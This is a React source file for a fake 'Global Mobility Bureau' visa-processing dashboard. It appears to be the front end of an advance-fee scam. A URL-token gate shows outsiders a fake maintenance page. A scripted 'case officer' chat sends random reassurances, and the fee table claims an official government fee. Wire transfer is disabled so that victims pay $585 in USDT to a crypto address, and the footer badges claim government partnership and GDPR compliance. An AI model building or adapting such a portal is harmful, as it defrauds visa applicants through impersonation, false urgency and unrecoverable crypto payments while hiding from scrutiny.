import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import {
  Shield, ShieldCheck, Lock, CheckCircle2, AlertTriangle, Copy, Loader2,
  MessageSquare, X, Send, ChevronRight, ExternalLink, Globe, FileCheck,
  Fingerprint, CreditCard, Wifi,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";

/* ───── token gate ───── */
const VALID_TOKENS = ["sec-9a3f7b", "exec-2026", "client-demo"];

/* ───── Maintenance / 404 screen ───── */
const MaintenanceScreen = () => (
  <div className="flex min-h-screen items-center justify-center" style={{ background: "hsl(0 0% 7%)" }}>
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center max-w-md px-6">
      <Shield className="mx-auto mb-6 h-16 w-16 text-muted-foreground/40" />
      <h1 className="text-2xl font-bold text-foreground mb-2" style={{ fontFamily: "'Playfair Display', serif" }}>
        System Maintenance
      </h1>
      <p className="text-sm text-muted-foreground mb-6">
        This portal is currently undergoing scheduled security maintenance. Please contact your case officer for access.
      </p>
      <div className="inline-flex items-center gap-2 rounded-full border border-muted px-4 py-2 text-xs text-muted-foreground">
        <Lock className="h-3 w-3" /> Secure Environment — Access Restricted
      </div>
    </motion.div>
  </div>
);

/* ───── Live Support Widget ───── */
const SupportWidget = () => {
  const [open, setOpen] = useState(false);
  const [messages, setMessages] = useState<{ from: string; text: string }[]>([
    { from: "agent", text: "Good day. I'm Diana, your dedicated case officer. How may I assist you today?" },
  ]);
  const [input, setInput] = useState("");
  const [typing, setTyping] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);

  const agentReplies = [
    "I've reviewed your case file. Everything is progressing as expected within the expedited timeline.",
    "Your consular allocation is being prioritized. You should receive confirmation within 24 hours of payment settlement.",
    "For security purposes, please ensure all documents are submitted through this portal only.",
    "I understand your concern. Let me escalate this to our senior compliance officer right away.",
  ];

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  const sendMessage = () => {
    if (!input.trim()) return;
    setMessages((m) => [...m, { from: "user", text: input }]);
    setInput("");
    setTyping(true);
    setTimeout(() => {
      setTyping(false);
      setMessages((m) => [
        ...m,
        { from: "agent", text: agentReplies[Math.floor(Math.random() * agentReplies.length)] },
      ]);
    }, 2200 + Math.random() * 1500);
  };

  return (
    <>
      {/* FAB */}
      <motion.button
        onClick={() => setOpen(true)}
        className="fixed bottom-6 right-6 z-50 flex h-14 w-14 items-center justify-center rounded-full shadow-lg"
        style={{ background: "hsl(40 47% 56%)" }}
        whileHover={{ scale: 1.08 }}
        whileTap={{ scale: 0.95 }}
      >
        <MessageSquare className="h-6 w-6 text-black" />
      </motion.button>

      {/* Chat panel */}
      <AnimatePresence>
        {open && (
          <motion.div
            initial={{ opacity: 0, y: 40, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 40, scale: 0.95 }}
            transition={{ duration: 0.35 }}
            className="fixed bottom-24 right-6 z-50 flex w-80 flex-col overflow-hidden rounded-2xl border shadow-2xl sm:w-96"
            style={{ background: "hsl(0 0% 10%)", borderColor: "hsl(0 0% 100% / 0.06)", maxHeight: "70vh" }}
          >
            {/* Header */}
            <div className="flex items-center gap-3 border-b px-4 py-3" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(213 30% 16%)" }}>
              <div className="relative">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-muted text-xs font-bold" style={{ color: "hsl(40 47% 56%)" }}>DK</div>
                <span className="absolute -bottom-0.5 -right-0.5 h-3 w-3 rounded-full border-2 bg-green-500" style={{ borderColor: "hsl(213 30% 16%)" }} />
              </div>
              <div className="flex-1">
                <p className="text-sm font-semibold text-foreground">Diana Kowalski</p>
                <p className="text-xs text-green-400">Online — Secure Channel</p>
              </div>
              <button onClick={() => setOpen(false)} className="text-muted-foreground hover:text-foreground transition-colors">
                <X className="h-5 w-5" />
              </button>
            </div>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto px-4 py-4 space-y-3" style={{ minHeight: 200, maxHeight: 320 }}>
              {messages.map((m, i) => (
                <div key={i} className={`flex ${m.from === "user" ? "justify-end" : "justify-start"}`}>
                  <div
                    className={`max-w-[80%] rounded-xl px-3 py-2 text-sm ${m.from === "user" ? "text-black" : "text-foreground"}`}
                    style={{ background: m.from === "user" ? "hsl(40 47% 56%)" : "hsl(0 0% 15%)" }}
                  >
                    {m.text}
                  </div>
                </div>
              ))}
              {typing && (
                <div className="flex justify-start">
                  <div className="rounded-xl px-4 py-2 text-sm text-muted-foreground" style={{ background: "hsl(0 0% 15%)" }}>
                    <span className="inline-flex gap-1">
                      <span className="animate-bounce" style={{ animationDelay: "0ms" }}>•</span>
                      <span className="animate-bounce" style={{ animationDelay: "150ms" }}>•</span>
                      <span className="animate-bounce" style={{ animationDelay: "300ms" }}>•</span>
                    </span>
                  </div>
                </div>
              )}
              <div ref={bottomRef} />
            </div>

            {/* Input */}
            <div className="flex items-center gap-2 border-t px-4 py-3" style={{ borderColor: "hsl(0 0% 100% / 0.06)" }}>
              <input
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && sendMessage()}
                placeholder="Type a secure message..."
                className="flex-1 bg-transparent text-sm text-foreground placeholder:text-muted-foreground outline-none"
              />
              <button onClick={sendMessage} className="text-muted-foreground hover:text-foreground transition-colors">
                <Send className="h-4 w-4" />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
};

/* ───── Payment Modal ───── */
const PaymentModal = ({ open, onClose }: { open: boolean; onClose: () => void }) => {
  const [copied, setCopied] = useState(false);
  const [verifying, setVerifying] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText("TXqR7v9kE2pN...8bYz3mWx");
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirm = () => {
    setVerifying(true);
    setTimeout(() => setVerifying(false), 4000);
  };

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm px-4"
          onClick={onClose}
        >
          <motion.div
            initial={{ scale: 0.92, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.92, opacity: 0 }}
            transition={{ duration: 0.35, ease: "easeOut" }}
            className="w-full max-w-lg rounded-2xl border shadow-2xl overflow-hidden"
            style={{ background: "hsl(0 0% 10%)", borderColor: "hsl(0 0% 100% / 0.06)" }}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between border-b px-6 py-4" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(213 30% 16%)" }}>
              <h2 className="text-lg font-bold text-foreground" style={{ fontFamily: "'Playfair Display', serif" }}>Secure Settlement</h2>
              <button onClick={onClose} className="text-muted-foreground hover:text-foreground"><X className="h-5 w-5" /></button>
            </div>

            <div className="p-6">
              <Tabs defaultValue="crypto">
                <TabsList className="w-full" style={{ background: "hsl(0 0% 13%)" }}>
                  <TabsTrigger value="wire" className="flex-1 text-xs">SWIFT / Wire</TabsTrigger>
                  <TabsTrigger value="crypto" className="flex-1 text-xs">Digital Asset (USDT/BTC)</TabsTrigger>
                </TabsList>

                <TabsContent value="wire" className="mt-6">
                  <div className="rounded-xl border p-6 text-center" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(0 0% 8%)" }}>
                    <CreditCard className="mx-auto mb-3 h-10 w-10 text-muted-foreground/40" />
                    <p className="text-sm font-semibold text-muted-foreground mb-1">Currently Under Maintenance</p>
                    <p className="text-xs text-muted-foreground/60 max-w-xs mx-auto">
                      Standard banking delays of 5–7 days detected. Use <span style={{ color: "hsl(40 47% 56%)" }}>Digital Assets</span> for Express 24h booking confirmation.
                    </p>
                  </div>
                </TabsContent>

                <TabsContent value="crypto" className="mt-6 space-y-5">
                  {/* QR */}
                  <div className="mx-auto flex h-40 w-40 items-center justify-center rounded-xl border" style={{ borderColor: "hsl(0 0% 100% / 0.08)", background: "hsl(0 0% 100%)" }}>
                    <div className="grid grid-cols-5 gap-1 p-3">
                      {Array.from({ length: 25 }).map((_, i) => (
                        <div key={i} className={`h-5 w-5 rounded-sm ${Math.random() > 0.4 ? "bg-black" : "bg-white"}`} />
                      ))}
                    </div>
                  </div>

                  {/* Address */}
                  <div className="flex items-center gap-2 rounded-lg border px-4 py-3" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(0 0% 8%)" }}>
                    <code className="flex-1 truncate text-xs text-muted-foreground">TXqR7v9kE2pN...8bYz3mWx</code>
                    <button onClick={handleCopy} className="flex items-center gap-1 text-xs font-medium transition-colors" style={{ color: "hsl(40 47% 56%)" }}>
                      <Copy className="h-3.5 w-3.5" /> {copied ? "Copied!" : "Copy"}
                    </button>
                  </div>

                  <div className="text-center">
                    <p className="text-xs text-muted-foreground mb-1">Send exactly</p>
                    <p className="text-2xl font-bold text-foreground" style={{ fontFamily: "'Playfair Display', serif" }}>$585.00 <span className="text-sm font-normal text-muted-foreground">USDT (TRC-20)</span></p>
                  </div>

                  {verifying ? (
                    <div className="flex items-center justify-center gap-3 rounded-lg py-4" style={{ background: "hsl(0 0% 8%)" }}>
                      <Loader2 className="h-5 w-5 animate-spin" style={{ color: "hsl(40 47% 56%)" }} />
                      <span className="text-sm text-muted-foreground">Awaiting Network Confirmation…</span>
                    </div>
                  ) : (
                    <Button onClick={handleConfirm} className="w-full text-black font-semibold" style={{ background: "hsl(40 47% 56%)" }}>
                      I Have Sent Payment
                    </Button>
                  )}
                </TabsContent>
              </Tabs>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

/* ═══════════════════════ MAIN DASHBOARD ═══════════════════════ */
const CrmDashboard = () => {
  const [params] = useSearchParams();
  const token = params.get("token");
  const [paymentOpen, setPaymentOpen] = useState(false);

  if (!token || !VALID_TOKENS.includes(token)) {
    return <MaintenanceScreen />;
  }

  const caseId = "#APP-829-2026";

  const steps = [
    { label: "KYC & Profile Registration", icon: FileCheck, status: "completed" as const },
    { label: "Background Intelligence Check", icon: Globe, status: "completed" as const },
    { label: "Consular Allocation & Expedited Fee", icon: AlertTriangle, status: "action" as const },
    { label: "Biometrics & Final Issuance", icon: Fingerprint, status: "locked" as const },
  ];

  const pricing = [
    { item: "Official Government Fee", amount: "$485.00" },
    { item: "Agency Priority Handling", amount: "$100.00" },
  ];

  const containerAnim = { hidden: { opacity: 0 }, show: { opacity: 1, transition: { staggerChildren: 0.12, delayChildren: 0.2 } } };
  const itemAnim = { hidden: { opacity: 0, y: 24 }, show: { opacity: 1, y: 0, transition: { duration: 0.6, ease: "easeOut" } } };

  return (
    <div className="min-h-screen" style={{ background: "hsl(0 0% 7%)", fontFamily: "'Inter', sans-serif" }}>
      {/* ── Top Bar ── */}
      <header className="border-b" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(213 30% 16%)" }}>
        <div className="mx-auto flex max-w-5xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-3">
            <ShieldCheck className="h-6 w-6" style={{ color: "hsl(40 47% 56%)" }} />
            <span className="text-lg font-bold tracking-tight text-foreground" style={{ fontFamily: "'Playfair Display', serif" }}>
              Global Mobility Bureau
            </span>
          </div>
          <div className="flex items-center gap-4">
            <div className="hidden items-center gap-2 rounded-full border px-3 py-1.5 text-xs sm:flex" style={{ borderColor: "hsl(0 0% 100% / 0.08)" }}>
              <Wifi className="h-3 w-3 text-green-400" />
              <span className="text-green-400 font-medium">Verified Connection</span>
            </div>
            <Badge className="border-none text-black text-xs font-semibold" style={{ background: "hsl(40 47% 56%)" }}>
              Security Clearance: Active
            </Badge>
          </div>
        </div>
      </header>

      <motion.main
        variants={containerAnim}
        initial="hidden"
        animate="show"
        className="mx-auto max-w-5xl px-6 py-10 space-y-8"
      >
        {/* ── Case Header ── */}
        <motion.div variants={itemAnim} className="flex flex-wrap items-end justify-between gap-4">
          <div>
            <p className="text-xs font-medium uppercase tracking-widest text-muted-foreground mb-1">Client Relations Dashboard</p>
            <h1 className="text-3xl font-bold text-foreground sm:text-4xl" style={{ fontFamily: "'Playfair Display', serif" }}>
              Case File Overview
            </h1>
          </div>
          <div className="flex items-center gap-2 rounded-lg border px-4 py-2" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(0 0% 10%)" }}>
            <Lock className="h-4 w-4 text-muted-foreground" />
            <span className="font-mono text-sm font-semibold text-foreground">{caseId}</span>
          </div>
        </motion.div>

        {/* ── Progress Stepper ── */}
        <motion.div variants={itemAnim} className="rounded-2xl border p-6 sm:p-8" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(0 0% 10%)" }}>
          <h2 className="text-lg font-bold text-foreground mb-6" style={{ fontFamily: "'Playfair Display', serif" }}>Application Progress</h2>
          <div className="space-y-0">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isLast = i === steps.length - 1;
              return (
                <div key={step.label} className="flex gap-4">
                  <div className="flex flex-col items-center">
                    {step.status === "completed" ? (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full" style={{ background: "hsl(40 47% 56% / 0.15)" }}>
                        <CheckCircle2 className="h-5 w-5" style={{ color: "hsl(40 47% 56%)" }} />
                      </div>
                    ) : step.status === "action" ? (
                      <div className="relative flex h-10 w-10 items-center justify-center rounded-full border-2" style={{ borderColor: "hsl(40 47% 56%)" }}>
                        <AlertTriangle className="h-5 w-5 animate-pulse" style={{ color: "hsl(40 47% 56%)" }} />
                      </div>
                    ) : (
                      <div className="flex h-10 w-10 items-center justify-center rounded-full border border-muted">
                        <Lock className="h-4 w-4 text-muted-foreground/50" />
                      </div>
                    )}
                    {!isLast && (
                      <div
                        className="w-px flex-1 min-h-[40px]"
                        style={{ background: step.status === "completed" ? "hsl(40 47% 56% / 0.3)" : "hsl(0 0% 100% / 0.06)" }}
                      />
                    )}
                  </div>
                  <div className="pb-8">
                    <div className="flex flex-wrap items-center gap-2">
                      <p className={`text-sm font-semibold ${step.status === "locked" ? "text-muted-foreground/50" : "text-foreground"}`}>
                        {step.label}
                      </p>
                      {step.status === "completed" && (
                        <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-semibold" style={{ background: "hsl(40 47% 56% / 0.12)", color: "hsl(40 47% 56%)" }}>
                          <CheckCircle2 className="h-3 w-3" /> Completed
                        </span>
                      )}
                      {step.status === "action" && (
                        <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-semibold bg-amber-500/15 text-amber-400">
                          <AlertTriangle className="h-3 w-3" /> Action Required
                        </span>
                      )}
                      {step.status === "locked" && (
                        <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-semibold text-muted-foreground/50 bg-muted/30">
                          <Lock className="h-3 w-3" /> Locked
                        </span>
                      )}
                    </div>
                    {step.status === "action" && (
                      <p className="mt-1 text-xs text-muted-foreground">Payment required to proceed with consular allocation.</p>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </motion.div>

        {/* ── Service Selection Card ── */}
        <motion.div variants={itemAnim} className="rounded-2xl border p-6 sm:p-8" style={{ borderColor: "hsl(0 0% 100% / 0.06)", background: "hsl(0 0% 10%)" }}>
          <div className="flex flex-wrap items-start justify-between gap-4 mb-6">
            <div>
              <h2 className="text-lg font-bold text-foreground" style={{ fontFamily: "'Playfair Display', serif" }}>Service Selection</h2>
              <p className="text-sm text-muted-foreground mt-1">Express 14-Day Visa Processing</p>
            </div>
            <Badge className="border-none text-black text-xs" style={{ background: "hsl(40 47% 56%)" }}>Expedited</Badge>
          </div>

          <div className="rounded-xl border overflow-hidden" style={{ borderColor: "hsl(0 0% 100% / 0.06)" }}>
            <table className="w-full text-sm">
              <thead>
                <tr style={{ background: "hsl(213 30% 16%)" }}>
                  <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-muted-foreground">Item</th>
                  <th className="px-5 py-3 text-right text-xs font-semibold uppercase tracking-wider text-muted-foreground">Amount</th>
                </tr>
              </thead>
              <tbody>
                {pricing.map((row, i) => (
                  <tr key={row.item} className="border-t" style={{ borderColor: "hsl(0 0% 100% / 0.04)" }}>
                    <td className="px-5 py-3.5 text-foreground">{row.item}</td>
                    <td className="px-5 py-3.5 text-right text-foreground font-mono">{row.amount}</td>
                  </tr>
                ))}
                <tr className="border-t" style={{ borderColor: "hsl(0 0% 100% / 0.08)", background: "hsl(0 0% 8%)" }}>
                  <td className="px-5 py-4 font-bold text-foreground" style={{ fontFamily: "'Playfair Display', serif" }}>Total Payable</td>
                  <td className="px-5 py-4 text-right text-lg font-bold font-mono" style={{ color: "hsl(40 47% 56%)" }}>$585.00</td>
                </tr>
              </tbody>
            </table>
          </div>

          <Button
            onClick={() => setPaymentOpen(true)}
            className="mt-6 w-full sm:w-auto text-black font-semibold gap-2"
            style={{ background: "hsl(40 47% 56%)" }}
          >
            Proceed to Secure Settlement <ChevronRight className="h-4 w-4" />
          </Button>
        </motion.div>

        {/* ── Security Footer ── */}
        <motion.div variants={itemAnim} className="flex flex-wrap items-center justify-center gap-6 py-6 text-xs text-muted-foreground/50">
          <span className="flex items-center gap-1.5"><Lock className="h-3 w-3" /> 256-bit TLS Encrypted</span>
          <span className="flex items-center gap-1.5"><ShieldCheck className="h-3 w-3" /> GDPR Compliant</span>
          <span className="flex items-center gap-1.5"><Globe className="h-3 w-3" /> Government-Partnered Portal</span>
        </motion.div>
      </motion.main>

      <PaymentModal open={paymentOpen} onClose={() => setPaymentOpen(false)} />
      <SupportWidget />
    </div>
  );
};

export default CrmDashboard;
